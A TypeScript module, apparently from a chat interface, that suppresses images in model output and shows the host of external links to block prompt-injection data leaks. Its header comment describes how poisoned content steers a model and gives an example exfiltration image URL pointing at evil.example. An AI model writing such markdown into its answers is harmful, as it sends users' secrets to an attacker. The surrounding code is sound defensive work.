/** Links and images in rendered model output (Phase 7a.2).
 *
 *  An answer or a tool result can carry text the model was steered into
 *  writing by a poisoned document or web page. Markdown such as
 *  `![](https://evil.example/?d=<secret>)` would make the browser fetch that
 *  address as soon as the answer renders, with no click: the way EchoLeak and
 *  the Slack AI leak sent data out. So images from model output are never
 *  loaded (the renderer shows a note instead), and a link to another site
 *  shows where it goes before anyone clicks it. The page's image policy
 *  (next.config.ts, `img-src`) is the second wall. */

/** The host an external link or image points at, or null when it stays on
 *  this site (a relative path, an in-page `#anchor`) or is not a web address.
 *  `origin` is the page's own origin; omit it to treat every absolute
 *  http(s) address as external. */
export function externalHost(href: string | undefined, origin?: string): string | null {
  if (!href) return null;
  let url: URL;
  try {
    url = new URL(href, origin ?? "http://this.site");
  } catch {
    return null;
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") return null;
  const own = origin ? new URL(origin).host : "this.site";
  return url.host === own ? null : url.host;
}

/** Whether a link's visible text already says where it goes, so adding the
 *  host beside it would only repeat it. */
export function textShowsAddress(text: string, href: string): boolean {
  const t = text.trim().toLowerCase().replace(/\/$/, "");
  const h = href.trim().toLowerCase().replace(/\/$/, "");
  return t === h || `https://${t}` === h || `http://${t}` === h;
}

/** What stands in for an image from model output. Says that an image was
 *  left out and where it would have come from, so nothing is silently
 *  hidden and a strange host stands out. */
export function imageNote(
  alt: string | undefined,
  src: string | undefined,
  origin?: string,
): string {
  const what = alt?.trim() ? `Image not shown: ${alt.trim()}` : "Image not shown";
  const host = externalHost(src, origin);
  return host ? `${what} (${host})` : what;
}
